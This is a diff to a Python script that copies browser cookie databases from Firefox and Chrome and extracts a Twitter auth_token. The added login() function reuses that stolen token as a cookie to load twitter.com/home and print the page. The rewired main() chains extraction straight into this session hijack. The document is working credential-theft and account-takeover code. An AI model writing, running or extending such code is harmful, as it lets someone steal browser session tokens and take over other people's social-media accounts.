@@ -2,6 +2,8 @@ import platform
 import shutil
 import os
 import sqlite3
+import requests
+from requests_html import HTMLSession
 from glob import glob
 
 def fetch_os():
@@ -71,12 +73,23 @@ def fetch_twitter_token(dbfile, browser):
         return row[0]
     pass
 
+def login(cookie):
+    url = "https://twitter.com/home"
+    cookies = dict(auth_token=cookie)
+    session = HTMLSession()
+    #r = requests.get(url, cookies=cookies, allow_redirects=True)
+    r = session.get(url, cookies=cookies)
+    session.resolve_redirects(r, session.get(url, cookies=cookies))
+    r.html.render()
+    print(r.text)
+
 def main():
     OS = fetch_os()
     copy_firefox_cookie_db(OS)
-    copy_chrome_cookie_db(OS)
-    print(fetch_twitter_token("./ff_cookies.sqlite", "FF"))
-    print(fetch_twitter_token("./ch_cookies.sqlite", "CH"))
+    #copy_chrome_cookie_db(OS)
+    #print(fetch_twitter_token("./ff_cookies.sqlite", "FF"))
+    #print(fetch_twitter_token("./ch_cookies.sqlite", "CH"))
+    login(fetch_twitter_token("./ff_cookies.sqlite", "FF"))
 
 
 if __name__ == "__main__":
